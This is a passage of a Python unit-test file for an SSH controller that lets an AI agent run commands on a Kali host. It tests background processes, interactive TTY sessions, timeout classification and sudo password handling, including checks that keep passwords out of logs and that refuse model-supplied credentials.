            "Serving HTTP on 0.0.0.0 port 8000",
            "Local: http://localhost:5173/",
            "Uvicorn running on http://127.0.0.1:8000",
        ):
            with self.subTest(banner=banner):
                self.assertEqual(
                    kali_access._failure_type(command, banner, "", 124, True),
                    "LONG_RUNNING_PROCESS_USED_AS_ONE_SHOT",
                )
        self.assertEqual(
            kali_access._process_strategy_key("python3 -m http.server 8000"),
            kali_access._process_strategy_key("python3 -m http.server 8001"),
        )
        self.assertEqual(
            kali_access._process_strategy_key("npm run dev -- --port=8000"),
            kali_access._process_strategy_key("npm run dev -- --port=5173"),
        )

    def test_real_one_shot_timeout_record_blocks_same_server_strategy(self):
        class Channel:
            def __init__(self):
                self.pending = [b"Serving HTTP on 0.0.0.0 port 8000"]

            def exec_command(self, _command): pass
            def shutdown_write(self): pass
            def recv_ready(self): return bool(self.pending)
            def recv(self, _size): return self.pending.pop(0)
            def recv_stderr_ready(self): return False
            def recv_stderr(self, _size): return b""
            def exit_status_ready(self): return not self.pending
            def recv_exit_status(self): return 124
            def close(self): pass

        channel = Channel()
        client = Mock()
        client.get_transport.return_value.open_session.return_value = channel
        runner = kali_access.KaliAccess()
        with (patch.object(runner, "connect", return_value=client),
              contextlib.redirect_stdout(io.StringIO())):
            runner.run("python3 -m http.server 8000")
        self.assertEqual(runner.last_record["failure_type"], "LONG_RUNNING_PROCESS_USED_AS_ONE_SHOT")
        self.assertIsNotNone(runner.failed_foreground_process_issue("python3 -m http.server 8001"))

    def test_timeout_allows_same_process_as_a_different_execution_mode(self):
        command = "python3 -m http.server 8000"
        workflow = kali_workflow.KaliWorkflow("host a local site", requires_preflight_check=True)
        self.assertIsNone(workflow.begin(
            "curl -fsS http://127.0.0.1:8000/", purpose="verify",
            hypothesis="site already responds", expected_result="exit_code=0",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "curl -fsS http://127.0.0.1:8000/",
            "execution_state": "completed", "exit_code": 7, "timed_out": False,
            "expected_result_match": False,
        }))
        self.assertIsNone(workflow.begin(command, purpose="change", execution_mode="one_shot"))
        self.assertIsNone(workflow.finish_command({
            "command": command,
            "execution_state": "timed_out",
            "exit_code": 124,
            "timed_out": True,
            "failure_type": "LONG_RUNNING_PROCESS_USED_AS_ONE_SHOT",
        }))
        self.assertTrue(workflow.change_attempted)
        self.assertTrue(workflow.verification_required_before_next_action)
        self.assertIn("may or may not have exited", workflow.prompt_state())
        self.assertIn("verification", workflow.begin(
            command, purpose="change", execution_mode="background_service", cwd="/home/kali",
        ))
        self.assertIsNone(workflow.begin(
            "curl -fsS http://127.0.0.1:8000/", purpose="verify",
            hypothesis="site already responds after timeout", expected_result="exit_code=0",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "curl -fsS http://127.0.0.1:8000/",
            "execution_state": "completed", "exit_code": 7, "timed_out": False,
            "expected_result_match": False,
        }))
        self.assertIsNone(workflow.begin(
            command, purpose="change", execution_mode="background_service", cwd="/home/kali",
        ))

    def test_background_process_lifecycle_uses_persistent_host_bound_handles(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            registry = Path(temp_dir) / "background_processes.json"
            runner = kali_access.KaliAccess()
            runner._process_registry_path = registry
            runner.last_record = {}
            helper = Mock(side_effect=[
                {"state": "running", "pid": 12345, "start_ticks": "9876"},
                {"state": "running", "pid": 12345},
                {"state": "stopped", "pid": 12345, "signal": "SIGTERM"},
            ])
            output = io.StringIO()
            with patch.object(runner, "_process_helper", helper), contextlib.redirect_stdout(output):
                started = runner.start_background(
                    "python3 -m http.server 8000", cwd="/home/kali",
                )
            match = re.search(r"process_id=(proc-[a-f0-9]+)", started)
            self.assertIsNotNone(match)
            process_id = match.group(1)
            self.assertEqual(helper.call_args.args[1]["argv"], [
                "python3", "-m", "http.server", "8000",
            ])
            self.assertEqual(helper.call_args.args[1]["cwd"], "/home/kali")

            restored = kali_access.KaliAccess()
            restored._process_registry_path = registry
            restored.background_processes.clear()
            restored._load_background_processes()
            self.assertIn(process_id, restored.background_processes)
            self.assertEqual(json.loads(registry.read_text(encoding="utf-8"))["target"],
                             restored._process_registry_target())
            restored.last_record = {}
            with patch.object(restored, "_process_helper", side_effect=[
                {"state": "running", "pid": 12345},
                {"state": "stopped", "pid": 12345, "signal": "SIGTERM"},
            ]), contextlib.redirect_stdout(io.StringIO()):
                checked = restored.check_process(process_id)
                stopped = restored.stop_process(process_id)
            self.assertIn("process_state=running", checked)
            self.assertIn("signal=SIGTERM", stopped)
            self.assertEqual(restored.background_processes[process_id]["state"], "stopped")

            original_target = restored._process_registry_target
            restored._process_registry_target = lambda: {"host": "different", "port": 2222, "user": "kali"}
            restored.background_processes.clear()
            restored._load_background_processes()
            self.assertFalse(restored.background_processes)
            restored._process_registry_target = original_target

    def test_background_registry_keeps_handles_from_two_agent_instances(self):
        with tempfile.TemporaryDirectory(dir=Path(__file__).parent) as temp_dir:
            registry = Path(temp_dir) / "background_processes.json"
            first = kali_access.KaliAccess()
            second = kali_access.KaliAccess()
            for runner in (first, second):
                runner._process_registry_path = registry
                runner.background_processes.clear()

            with (patch.object(first, "_process_helper", return_value={
                    "state": "running", "pid": 12345, "start_ticks": "1001"}),
                  contextlib.redirect_stdout(io.StringIO())):
                first_output = first.start_background("python3 -m http.server 8000", cwd="/home/kali")
            first_id = re.search(r"process_id=(proc-[a-f0-9]+)", first_output).group(1)
            second._load_background_processes()
            with (patch.object(first, "_process_helper", return_value={
                    "state": "stopped", "pid": 12345}),
                  contextlib.redirect_stdout(io.StringIO())):
                first.check_process(first_id)
            self.assertEqual(first.background_processes[first_id]["state"], "stopped")
            self.assertEqual(second.background_processes[first_id]["state"], "running")
            with (patch.object(second, "_process_helper", return_value={
                    "state": "running", "pid": 12346, "start_ticks": "1002"}),
                  contextlib.redirect_stdout(io.StringIO())):
                second_output = second.start_background("python3 -m http.server 8001", cwd="/home/kali")

            second_id = re.search(r"process_id=(proc-[a-f0-9]+)", second_output).group(1)
            restored = kali_access.KaliAccess()
            restored._process_registry_path = registry
            restored.background_processes.clear()
            restored._load_background_processes()

            self.assertIn(first_id, restored.background_processes)
            self.assertIn(second_id, restored.background_processes)
            self.assertEqual(restored.background_processes[first_id]["state"], "stopped")

    def test_background_registry_prunes_old_stopped_entries_but_keeps_new_handles(self):
        with tempfile.TemporaryDirectory(dir=Path(__file__).parent) as temp_dir:
            registry = Path(temp_dir) / "background_processes.json"
            runner = kali_access.KaliAccess()
            runner._process_registry_path = registry
            runner.background_processes = {
                "proc-" + format(index, "032x"): {
                    "process_id": "proc-" + format(index, "032x"),
                    "pid": index + 100,
                    "start_ticks": str(index + 1000),
                    "program": "python3",
                    "cwd": "/home/kali",
                    "state": "stopped",
                    "started_at": f"2025-01-01T00:{index // 60:02d}:{index % 60:02d}+00:00",
                    "updated_at": f"2025-05-01T00:{index // 60:02d}:{index % 60:02d}+00:00",
                }
                for index in range(kali_access.MAX_BACKGROUND_REGISTRY_ENTRIES)
            }
            runner._save_background_processes()
            new_id = "proc-" + "f" * 32
            runner.background_processes[new_id] = {
                "process_id": new_id,
                "pid": 99999,
                "start_ticks": "999999",
                "program": "python3",
                "cwd": "/home/kali",
                "state": "running",
                "started_at": "2026-09-29T00:00:00+00:00",
                "updated_at": "2026-09-29T00:00:00+00:00",
            }
            runner._save_background_processes()

            restored = kali_access.KaliAccess()
            restored._process_registry_path = registry
            restored.background_processes.clear()
            restored._load_background_processes()
            self.assertEqual(len(restored.background_processes), kali_access.MAX_BACKGROUND_REGISTRY_ENTRIES)
            self.assertIn(new_id, restored.background_processes)
            self.assertNotIn("proc-" + format(0, "032x"), restored.background_processes)
            self.assertIn("proc-" + format(99, "032x"), restored.background_processes)

    def test_background_process_request_bounds_environment_and_helper_size(self):
        with self.assertRaisesRegex(ValueError, "16 KB"):
            kali_access.KaliAccess._validate_background_request(
                "python3 -m http.server 8000", None,
                {"DATA1": "x" * 8192, "DATA2": "y" * 8192},
            )
        with self.assertRaisesRegex(ValueError, "SSH command channel"):
            runner = kali_access.KaliAccess()
            runner._process_helper("start", {"argv": ["python3", "x" * 60_000]}, "test")

    def test_background_registry_is_not_reused_for_a_different_kali_target(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            registry = Path(temp_dir) / "background_processes.json"
            source = kali_access.KaliAccess()
            source._process_registry_path = registry
            source.background_processes = {
                "proc-example": {
                    "process_id": "proc-example", "pid": 12345, "start_ticks": "9876",
                    "program": "python3", "cwd": "/home/kali", "state": "running",
                    "started_at": "2026-01-01T00:00:00+00:00",
                },
            }
            source._save_background_processes()
            other = kali_access.KaliAccess()
            other._process_registry_path = registry
            other._process_registry_target = lambda: {"host": "different", "port": 2222, "user": "kali"}
            other._load_background_processes()
            self.assertNotIn("proc-example", other.background_processes)

    def test_background_registry_ignores_corrupt_or_malformed_entries(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            registry = Path(temp_dir) / "background_processes.json"
            runner = kali_access.KaliAccess()
            runner.background_processes.clear()
            runner._process_registry_path = registry
            registry.write_bytes(b"\xff\xfepartial-json")
            runner._load_background_processes()
            self.assertFalse(runner.background_processes)

            process_id = "proc-" + "a" * 32
            registry.write_text(json.dumps({
                "target": runner._process_registry_target(),
                "processes": {
                    process_id: {
                        "pid": 12345, "start_ticks": "9876", "state": [],
                        "program": "python3", "cwd": "/home/kali",
                    },
                    "proc-invalid-id": {
                        "pid": 12346, "start_ticks": "9877", "state": "running",
                        "program": "python3", "cwd": "/home/kali",
                    },
                },
            }), encoding="utf-8")
            runner._load_background_processes()
            self.assertFalse(runner.background_processes)

    def test_process_tool_schemas_accept_cwd_and_lifecycle_calls(self):
        calls = [
            deep_agent._make_tool_call("start_background", {
                "command": "python3 -m http.server 8000", "cwd": "/home/kali",
            }),
            deep_agent._make_tool_call("check_process", {
                "process_id": "proc-123", "expected_result": "process_state=running",
            }),
            deep_agent._make_tool_call("stop_process", {"process_id": "proc-123"}),
        ]
        expected_names = ["start_background", "check_process", "stop_process"]
        for call, expected_name in zip(calls, expected_names):
            with self.subTest(tool=expected_name):
                reply = {"tool_calls": [call]}
                self.assertTrue(deep_agent._tool_call_schema_valid(reply))
                name, _arguments, _call_id = deep_agent._tool_request(reply)
                self.assertEqual(name, expected_name)

    def test_interactive_tool_schemas_validate_handles_waits_and_single_line_input(self):
        tty_id = "tty-" + "a" * 32
        calls = [
            deep_agent._make_tool_call("start_interactive", {
                "command": "top", "cwd": "/home/kali",
            }),
            deep_agent._make_tool_call("read_interactive", {
                "tty_id": tty_id, "wait_ms": 250, "expected_result": "process_state=running",
            }),
            deep_agent._make_tool_call("send_interactive_input", {
                "tty_id": tty_id, "input_text": "q",
            }),
            deep_agent._make_tool_call("interrupt_interactive", {"tty_id": tty_id}),
        ]
        expected_names = [
            "start_interactive", "read_interactive", "send_interactive_input",
            "interrupt_interactive",
        ]
        for call, expected_name in zip(calls, expected_names):
            with self.subTest(tool=expected_name):
                reply = {"tool_calls": [call]}
                self.assertTrue(deep_agent._tool_call_schema_valid(reply))
                name, _arguments, _call_id = deep_agent._tool_request(reply)
                self.assertEqual(name, expected_name)

        multiline = deep_agent._make_tool_call("send_interactive_input", {
            "tty_id": tty_id, "input_text": "one\ntwo",
        })
        self.assertFalse(deep_agent._tool_call_schema_valid({"tool_calls": [multiline]}))
        with self.assertRaisesRegex(ValueError, "printable line"):
            deep_agent._tool_request({"tool_calls": [multiline]})

        invalid_wait = deep_agent._make_tool_call("read_interactive", {
            "tty_id": tty_id, "wait_ms": 5001,
        })
        self.assertFalse(deep_agent._tool_call_schema_valid({"tool_calls": [invalid_wait]}))
        false_check = deep_agent._make_tool_call("read_interactive", {
            "tty_id": tty_id, "expected_result": "exit_code=0",
        })
        self.assertFalse(deep_agent._tool_call_schema_valid({"tool_calls": [false_check]}))

    def test_interactive_start_uses_a_tty_and_explicit_working_directory(self):
        class Channel:
            def __init__(self):
                self.pending = [b"\x1b[32mready\x1b[0m\n"]
                self.command = None

            def settimeout(self, _seconds): pass
            def get_pty(self, **kwargs): self.pty = kwargs
            def exec_command(self, command): self.command = command
            def recv_ready(self): return bool(self.pending)
            def recv(self, _size): return self.pending.pop(0)
            def exit_status_ready(self): return False
            def close(self): pass

        channel = Channel()
        client = Mock()
        transport = client.get_transport.return_value
        transport.is_active.return_value = True
        transport.open_session.return_value = channel
        runner = kali_access.KaliAccess()
        with (patch.object(runner, "connect", return_value=client),
              contextlib.redirect_stdout(io.StringIO())):
            output = runner.start_interactive("top", cwd="/home/kali")

        self.assertEqual(channel.command, "cd -- /home/kali && exec top")
        self.assertEqual(channel.pty["term"], "xterm")
        self.assertIn("ready", output)
        self.assertNotIn("32m", output)
        self.assertEqual(
            kali_access.KaliAccess._safe_terminal_text(b"\x1b]0;window title\x07ready"),
            "ready",
        )
        self.assertRegex(output, r"tty_id=tty-[a-f0-9]{32}")
        self.assertEqual(runner.last_record["operation"], "start_interactive")
        self.assertEqual(runner.last_record["execution_state"], "completed")
        self.assertEqual(runner.last_record["process"]["state"], "running")
        self.assertEqual(runner.last_record["cwd"], "/home/kali")

    def test_execute_kali_dispatches_interactive_lifecycle_operations(self):
        tty_id = "tty-" + "c" * 32
        runner = Mock()

        def result_for(operation):
            def apply(*_args, **_kwargs):
                runner.last_record = {
                    "evidence_id": operation,
                    "command": operation,
                    "operation": operation,
                    "state": "OBSERVED",
                    "execution_state": "completed",
                    "exit_code": 0,
                    "stdout": "process_state=running\n",
                    "stderr": "",
                    "timed_out": False,
                    "duration_seconds": 0.01,
                }
                return operation
            return apply

        for name in (
            "start_interactive", "read_interactive",
            "send_interactive_input", "interrupt_interactive",
        ):
            getattr(runner, name).side_effect = result_for(name)

        cases = [
            ("start_interactive", "top", {"command": "top", "cwd": "/home/kali"}),
            ("read_interactive", f"read_interactive {tty_id}", {"tty_id": tty_id, "wait_ms": 250}),
            ("send_interactive_input", f"send_interactive_input {tty_id}", {"tty_id": tty_id, "input_text": "q"}),
            ("interrupt_interactive", f"interrupt_interactive {tty_id}", {"tty_id": tty_id}),
        ]
        messages = []
        with patch.object(deep_agent, "EVIDENCE_LEDGER", deep_agent.EvidenceLedger()):
            for index, (name, command, arguments) in enumerate(cases):
                output = deep_agent._execute_kali(
                    runner, messages, command, f"call-{index}",
                    tool_name=name, tool_arguments=arguments,
                )
                self.assertEqual(output, name)

        runner.start_interactive.assert_called_once_with(
            "top", cwd="/home/kali", env=None,
        )
        runner.read_interactive.assert_called_once_with(tty_id, wait_ms=250)
        runner.send_interactive_input.assert_called_once_with(tty_id, "q")
        runner.interrupt_interactive.assert_called_once_with(tty_id)
        self.assertEqual(len(messages), 8)

    def test_interactive_input_drains_output_before_blocking_secret_prompts(self):
        class Channel:
            def __init__(self):
                self.pending = [b"\x1b[?25", b"lPassword: "]
                self.sent = []

            def recv_ready(self): return bool(self.pending)
            def recv(self, _size): return self.pending.pop(0)
            def exit_status_ready(self): return False
            def sendall(self, data): self.sent.append(data)

        tty_id = "tty-" + "b" * 32
        channel = Channel()
        runner = kali_access.KaliAccess()
        runner.interactive_processes[tty_id] = {
            "process_id": tty_id,
            "channel": channel,
            "program": "demo",
            "cwd": "/home/kali",
            "state": "running",
            "exit_code": None,
            "output_tail": "",
            "output_truncated": False,
        }
        proposed_input = "not-a-real-password"
        with contextlib.redirect_stdout(io.StringIO()):
            output = runner.send_interactive_input(tty_id, proposed_input)

        self.assertEqual(channel.sent, [])
        self.assertIn("Password:", output)
        self.assertIn("will not send model-provided credentials", output)
        self.assertNotIn(proposed_input, json.dumps(runner.last_record))
        self.assertEqual(runner.last_record["execution_state"], "not_started")
        self.assertEqual(runner.last_record["failure_type"], "CONTROLLER_REJECTED")

    def test_interactive_mode_rejects_shells_and_sudo(self):
        for command in ("bash", "sudo top", "env TERM=xterm /bin/bash"):
            with self.subTest(command=command), self.assertRaisesRegex(ValueError, "Interactive mode"):
                kali_access.KaliAccess._validate_interactive_request(command, None, None)
        argv, _env = kali_access.KaliAccess._validate_interactive_request(
            "top", "/home/kali", None,
        )
        self.assertEqual(argv, ["top"])

    def test_target_scoped_workflows_reject_interactive_tty_tools(self):
        kali = Mock()
        call = deep_agent._make_tool_call("start_interactive", {"command": "top"})
        replies = iter([
            {"content": "", "tool_calls": [call]},
            {"content": "TTY operations are outside the scoped workflow.", "tool_calls": []},
        ])
        messages = [
            {"role": "system", "content": deep_agent.SHELL_SYSTEM_PROMPT},
            {"role": "user", "content": "assess the specified lab target"},
        ]
        output = io.StringIO()
        with (patch.object(deep_agent, "CONTROLLER_DIAGNOSTICS", []) as diagnostics,
              patch.object(deep_agent, "_model_chat", side_effect=lambda *args, **kwargs: next(replies)),
              contextlib.redirect_stdout(output)):
            deep_agent._run_kali_turn(
                kali, messages, "assess the specified lab target", None,
                scope_target="192.168.56.101",
            )

        kali.start_interactive.assert_not_called()
        self.assertTrue(any(
            "interactive TTY operations are unavailable" in record.get("reason", "")
            for record in diagnostics
        ))

    def test_interactive_start_requires_a_later_read_only_outcome_check(self):
        workflow = kali_workflow.KaliWorkflow(
            "launch the TTY application", requires_goal_check=True,
            requires_preflight_check=True,
        )
        self.assertIsNone(workflow.begin(
            "curl -fsS http://127.0.0.1:9000/", purpose="verify",
            hypothesis="TTY app endpoint already responds", expected_result="exit_code=0",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "curl -fsS http://127.0.0.1:9000/",
            "execution_state": "completed", "exit_code": 7, "timed_out": False,
            "expected_result_match": False,
        }))
        self.assertIsNone(workflow.begin(
            "top", purpose="change", execution_mode="interactive_tty",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "top", "operation": "start_interactive",
            "execution_state": "completed", "exit_code": 0,
            "stdout": "tty_id=tty-" + "a" * 32 + "\nprocess_state=running\n",
        }))
        self.assertTrue(workflow.verification_required_before_next_action)
        self.assertIsNotNone(workflow.begin(
            "read_interactive tty-" + "a" * 32, purpose="inspect",
            execution_mode="interactive_read",
        ))
        self.assertIsNone(workflow.begin(
            "read_interactive tty-" + "a" * 32, purpose="verify",
            execution_mode="interactive_read", expected_result="process_state=running",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "read_interactive tty-" + "a" * 32,
            "execution_state": "completed", "exit_code": 0,
            "stdout": "process_state=running\n",
            "stderr": "",
            "expected_result_match": True,
        }))
        self.assertFalse(workflow.outcome_check_pending)

    def test_background_workflow_preflights_then_starts_and_verifies_the_endpoint(self):
        preflight = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -fsS http://127.0.0.1:8000/",
            "purpose": "verify", "hypothesis": "requested site already responds",
            "expected_result": "exit_code=0",
        })
        start = deep_agent._make_tool_call("start_background", {
            "command": "python3 -m http.server 8000", "cwd": "/home/kali",
        })
        verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "curl -fsS http://127.0.0.1:8000/",
            "purpose": "verify", "hypothesis": "site responds on requested port",
            "expected_result": "Welcome",
        })
        replies = iter([
            {"content": "", "tool_calls": [preflight]},
            {"content": "", "tool_calls": [start]},
            {"content": "", "tool_calls": [verify]},
            {"content": "", "tool_calls": [deep_agent._make_tool_call("run_kali_command", {
                "command": "systemctl status apache2",
                "purpose": "inspect", "hypothesis": "another service detail",
            })]},
        ])
        snapshots = []
        kali = Mock()
        kali.sudo_mode = False
        kali.clear_sudo_mode.side_effect = lambda: setattr(kali, "sudo_mode", False)

        run_count = 0

        def run(command):
            nonlocal run_count
            run_count += 1
            is_preflight = run_count == 1
            record = {
                "command": command, "operation": "run_kali_command",
                "execution_state": "completed", "exit_code": 7 if is_preflight else 0,
                "stdout": "" if is_preflight else "Welcome to the local site\n",
                "stderr": "connection refused\n" if is_preflight else "",
                "timed_out": False, "duration_seconds": 0.01,
                "privilege_mode": "user", "sudo_access_validated": False,
            }
            kali.last_record = record
            return ("curl: connection refused\n[exit 7; 0.01s]" if is_preflight
                    else "Welcome to the local site\n[exit 0; 0.01s]")

        def start_background(command, *, cwd=None, env=None):
            kali.last_record = {
                "command": command, "operation": "start_background",
                "execution_state": "completed", "exit_code": 0,
                "stdout": "process_id=proc-test\nprocess_state=running\n",
                "stderr": "", "timed_out": False, "duration_seconds": 0.01,
                "process": {"process_id": "proc-test", "pid": 12345, "state": "running"},
            }
            return kali.last_record["stdout"]

        kali.run.side_effect = run
        kali.start_background.side_effect = start_background

        def model(messages, *, tools, stream_output):
            snapshots.append((tools, stream_output, [dict(item) for item in messages]))
            return next(replies)

        output = io.StringIO()
        with (patch("builtins.input", side_effect=["/shell", "host the site on port 8000", "exit"]),
              patch("kali_access.KaliAccess", return_value=kali),
              patch.object(deep_agent, "_model_chat", side_effect=model),
              contextlib.redirect_stdout(output)):
            deep_agent.chat_loop()

        self.assertEqual(kali.run.call_count, 2)
        self.assertEqual(kali.run.call_args_list[0].args[0], "curl -fsS http://127.0.0.1:8000/")
        self.assertEqual(kali.start_background.call_args.args[0], "python3 -m http.server 8000")
        self.assertEqual(kali.start_background.call_args.kwargs["cwd"], "/home/kali")
        self.assertEqual(kali.run.call_args_list[1].args[0], "curl -fsS http://127.0.0.1:8000/")
        self.assertIn("expected condition 'Welcome' matched captured output", output.getvalue())
        self.assertEqual([call[0] for call in snapshots], [True, True, True, False])

    def test_legacy_json_command_recovery_preserves_working_directory(self):
        call = deep_agent._call_from_text(
            '{"command":"python3 -m http.server 8000","cwd":"/home/kali","analysis":"start"}'
        )
        self.assertIsNotNone(call)
        name, arguments, _call_id = deep_agent._tool_request({"tool_calls": [call]})
        self.assertEqual(name, "run_kali_command")
        self.assertEqual(arguments["cwd"], "/home/kali")

    def test_large_multiline_heredoc_reaches_ssh_intact(self):
        command = "cat > ~/portfolio/index.html <<'EOF'\n" + "<p>It's a page: $HOME</p>\n" * 150 + "EOF"
        channel = Mock()
        channel.recv_ready.return_value = False
        channel.recv_stderr_ready.return_value = False
        channel.exit_status_ready.return_value = True
        channel.recv_exit_status.return_value = 0
        client = Mock()
        client.get_transport.return_value.open_session.return_value = channel
        runner = kali_access.KaliAccess()
        with patch.object(runner, "connect", return_value=client), contextlib.redirect_stdout(io.StringIO()):
            result = runner.run(command.replace("\n", "\r\n"))
        wrapped = shlex.split(channel.exec_command.call_args.args[0])
        self.assertEqual(wrapped[-1], command + "\n")
        self.assertIn("[exit 0;", result)

    def test_command_duration_excludes_connection_time(self):
        now = [0.0]
        channel = Mock()
        channel.recv_ready.return_value = False
        channel.recv_stderr_ready.return_value = False

        def finish_command():
            now[0] += 0.25
            return True

        channel.exit_status_ready.side_effect = finish_command
        channel.recv_exit_status.return_value = 0
        client = Mock()
        client.get_transport.return_value.open_session.return_value = channel
        runner = kali_access.KaliAccess()

        def connect():
            now[0] += 10  # Model a slow password prompt or SSH connection.
            return client

        output = io.StringIO()
        with (patch.object(runner, "connect", side_effect=connect),
              patch.object(kali_access.time, "monotonic", side_effect=lambda: now[0]),
              contextlib.redirect_stdout(output)):
            result = runner.run("hostname")

        self.assertEqual(runner.last_record["duration_seconds"], 0.25)
        self.assertIn("[exit 0; 0.25s]", result)

    def test_sudo_password_is_prompted_locally_and_sent_over_stdin(self):
        channel = Mock()
        channel.recv_ready.return_value = False
        channel.recv_stderr_ready.return_value = False
        channel.exit_status_ready.return_value = True
        channel.recv_exit_status.return_value = 0
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.return_value = channel
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        output = io.StringIO()
        with (patch.object(runner, "connect", return_value=client),
              patch.object(kali_access.getpass, "getpass", return_value="secret-pass") as prompt,
              contextlib.redirect_stdout(output)):
            result = runner.run("sudo id -u")

        prompt.assert_called_once()
        remote_command = channel.exec_command.call_args.args[0]
        remote_script = shlex.split(remote_command)[-1]
        self.assertIn("sudo -S -p '' -- bash", remote_script)
        self.assertIn("exec </dev/null && id -u", remote_script)
        self.assertNotIn("secret-pass", remote_command)
        self.assertEqual(bytes(channel.sendall.call_args.args[0]), b"secret-pass\n")
        self.assertEqual(runner.last_record["command"], "sudo id -u")
        self.assertNotIn("secret-pass", json.dumps(runner.last_record))
        evidence = deep_agent.EvidenceLedger().record_command(runner.last_record)
        recorded = evidence.to_dict(include_streams=False)
        self.assertEqual(recorded["privilege_mode"], "sudo")
        self.assertTrue(recorded["sudo_password_prompted"])
        self.assertTrue(recorded["sudo_password_sent"])
        self.assertNotIn("secret-pass", json.dumps(recorded))
        self.assertIn("[exit 0;", result)

    def test_bare_sudo_prompts_and_runs_only_a_credential_check(self):
        channel = Mock()
        channel.recv_ready.return_value = False
        channel.recv_stderr_ready.return_value = False
        channel.exit_status_ready.return_value = True
        channel.recv_exit_status.return_value = 0
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.return_value = channel
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        with (patch.object(runner, "connect", return_value=client),
              patch.object(kali_access.getpass, "getpass", return_value="secret-pass") as prompt,
              contextlib.redirect_stdout(io.StringIO())):
            runner.run("sudo")

        prompt.assert_called_once()
        remote_command = channel.exec_command.call_args.args[0]
        remote_script = shlex.split(remote_command)[-1]
        self.assertIn("sudo -S -p '' -v", remote_script)
        self.assertNotIn("-- bash", remote_script)
        self.assertNotIn("secret-pass", remote_command)
        self.assertEqual(bytes(channel.sendall.call_args.args[0]), b"secret-pass\n")
        self.assertEqual(runner.last_record["privilege_mode"], "sudo_validation")
        self.assertTrue(runner.last_record["sudo_access_validated"])
        self.assertNotIn("secret-pass", json.dumps(runner.last_record))
        self.assertTrue(runner.sudo_mode)
        self.assertEqual(runner._sudo_password, bytearray(b"secret-pass"))

    def test_bare_sudo_then_command_uses_one_local_password_prompt(self):
        channels = []
        for _ in range(2):
            channel = Mock()
            channel.recv_ready.return_value = False
            channel.recv_stderr_ready.return_value = False
            channel.exit_status_ready.return_value = True
            channel.recv_exit_status.return_value = 0
            channels.append(channel)
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.side_effect = channels
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        with (patch.object(runner, "connect", return_value=client),
              patch.object(kali_access.getpass, "getpass", return_value="secret-pass") as prompt,
              contextlib.redirect_stdout(io.StringIO())):
            runner.run("sudo")
            runner.run("id -u")

        prompt.assert_called_once()
        self.assertIn("sudo -S -p '' -v", shlex.split(channels[0].exec_command.call_args.args[0])[-1])
        self.assertIn("sudo -S -p '' -- bash", shlex.split(channels[1].exec_command.call_args.args[0])[-1])
        self.assertEqual(bytes(channels[0].sendall.call_args.args[0]), b"secret-pass\n")
        self.assertEqual(bytes(channels[1].sendall.call_args.args[0]), b"secret-pass\n")
        self.assertTrue(runner.sudo_mode)
        self.assertEqual(runner.last_record["privilege_mode"], "sudo_session")

    def test_wrong_sudo_password_reprompts_and_records_only_attempt_metadata(self):
        class Channel:
            def __init__(self, stderr, exit_code):
                self.pending_stderr = [stderr] if stderr else []
                self.exit_code = exit_code
                self.sent = []
                self.command = None

            def exec_command(self, command):
                self.command = command

            def sendall(self, data):
                self.sent.append(bytes(data))

            def shutdown_write(self):
                pass

            def recv_ready(self):
                return False

            def recv(self, _size):
                return b""

            def recv_stderr_ready(self):
                return bool(self.pending_stderr)

            def recv_stderr(self, _size):
                return self.pending_stderr.pop(0)

            def exit_status_ready(self):
                return not self.pending_stderr

            def recv_exit_status(self):
                return self.exit_code

            def close(self):
                pass

        channels = [
            Channel(b"Sorry, try again.\nsudo: no password was provided\n", 1),
            Channel(b"", 0),
        ]
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.side_effect = channels
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        output = io.StringIO()
        with (patch.object(runner, "connect", return_value=client),
              patch.object(kali_access.getpass, "getpass", side_effect=["wrong-pass", "right-pass"]) as prompt,
              contextlib.redirect_stdout(output)):
            runner.run("sudo")

        self.assertEqual(prompt.call_count, 2)
        self.assertIn("attempt 2/3", prompt.call_args_list[1].args[0])
        self.assertEqual(channels[0].sent, [b"wrong-pass\n"])
        self.assertEqual(channels[1].sent, [b"right-pass\n"])
        self.assertTrue(runner.sudo_mode)
        self.assertEqual(runner.last_record["sudo_attempt_history"], [
            {"attempt": 1, "password_rejected": True},
            {"attempt": 2, "password_rejected": False},
        ])
        self.assertNotIn("wrong-pass", json.dumps(runner.last_record))
        self.assertNotIn("right-pass", json.dumps(runner.last_record))
        self.assertNotIn("no password was provided", output.getvalue())
        self.assertIn("Kali rejected the sudo password", output.getvalue())

    def test_sudo_password_retries_stop_after_three_attempts(self):
        class Channel:
            def __init__(self):
                self.pending_stderr = [b"Sorry, try again.\nsudo: no password was provided\n"]

            def exec_command(self, _command): pass
            def sendall(self, _data): pass
            def shutdown_write(self): pass
            def recv_ready(self): return False
            def recv(self, _size): return b""
            def recv_stderr_ready(self): return bool(self.pending_stderr)
            def recv_stderr(self, _size): return self.pending_stderr.pop(0)
            def exit_status_ready(self): return not self.pending_stderr
            def recv_exit_status(self): return 1
            def close(self): pass

        channels = [Channel(), Channel(), Channel()]
        transport = Mock()
        transport.is_active.return_value = True
        transport.open_session.side_effect = channels
        client = Mock()
        client.get_transport.return_value = transport
        runner = kali_access.KaliAccess()
        output = io.StringIO()
        with (patch.object(runner, "connect", return_value=client),
              patch.object(kali_access.getpass, "getpass", side_effect=["bad1", "bad2", "bad3"]) as prompt,
              contextlib.redirect_stdout(output)):
            runner.run("sudo")

        self.assertEqual(prompt.call_count, 3)
        self.assertFalse(runner.sudo_mode)
        self.assertEqual(runner.last_record["sudo_attempt"], 3)
        self.assertEqual(len(runner.last_record["sudo_attempt_history"]), 3)
        self.assertIn("after 3 attempts", output.getvalue())

    def test_session_sudo_mode_runs_commands_with_noninteractive_sudo(self):
        channel = Mock()
        channel.recv_ready.return_value = False
